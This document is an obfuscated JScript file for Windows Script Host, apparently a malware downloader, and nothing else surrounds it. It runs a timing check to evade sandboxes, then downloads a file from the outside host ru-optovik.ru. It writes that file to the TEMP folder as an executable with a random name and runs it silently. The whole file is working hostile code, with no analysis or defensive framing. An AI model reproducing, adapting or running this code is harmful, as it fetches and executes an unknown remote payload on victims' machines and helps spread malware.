var _P = false;
var _DA = "CreateObject";
var _MR = function _FC() {return WScript[_DA]("WScript"+".Shell");}(), _YM = 11;
var _EY = "MSXML2.XMLHTTP";
var _AK = 2123213;
var _AO = 0;
function _EE(_CE){_MR["Run"](_CE, _AO, _AO);};
function _Y(){return _EY + "";};
function _R0(_S, _PX){_AO = _AO * 1; return _S - _PX;};
function _EG(){return _DA;};
/*@cc_on
  @if (@_win32 || @_win64)
    _P = true;
  @end
@*/
if (_P)
{
var _IA = "";
function _R(){return 22;};
var _Q0 = 0; var _J0 = 0;
function _B()
{
var _FP = new this["Date"]();
var _RB = _FP["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _FP = new this["Date"]();
var _J = _FP["getUTCMilliseconds"]();
WScript["Sleep"](_R());
var _FP = new this["Date"]();
var _D = _FP["getUTCMilliseconds"]();
var _Q0 = "_Q";
_Q0 = _R0(_J, _RB);
var _J0 = "_JG";
_J0 = _R0(_D, _J);
_IA = "open";
return _R0(_Q0, _J0);
}
var _QJ = false;
var _CX = false;
for (var _KM = _AO; _KM < _R() * 1; _KM++){if (_B() != _AO){
_QJ = true; 
_J0 = "31" + 11 * _Q0 + _J0; 
_CX = true; 
break;
}}
function _K() {return ((_QJ == true) && (_QJ == _CX)) ? 1 : _AO;};
if (_QJ && _K() && _CX){
function _PE() {return _MR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "msxRN8QdODdHh3F.ex" + "e";};
 _WP = _Y();
 _AO0 = WScript[_DA](_WP);
 var _JN = 1;
 while (_JN){
try {
	if (_JN == 1)
	{
		_AO0[_IA]("GET", "http://ru-optovik.ru/j9ssl", false);
		_AO0["send"]();
		_B0 = "Sleep";
	}
	WScript[_B0](_R() + 120); 
	if (_AO0["readystate"] < 2 * 2) continue;
	_JN = _AO;
	function _E(_Z) {var _XH = (1, 2, 3, 4, 5, _Z); return _XH;};
	_K0 = WScript[_EG()]("ADODB.Stream");
	_WP = _K0;
	_WP[_IA]();
	_WP["type"] = _E(1);
	_WP["write"](_AO0["ResponseBody"]);
	_K0["position"] = _E(_AO);
	_WP["Save" + "ToFile"](_PE(), 2);
	_K0["cl"+"ose"]();
	_XQ = _PE();
	_EE(_XQ);
} catch(_Y0){};
}
}
}

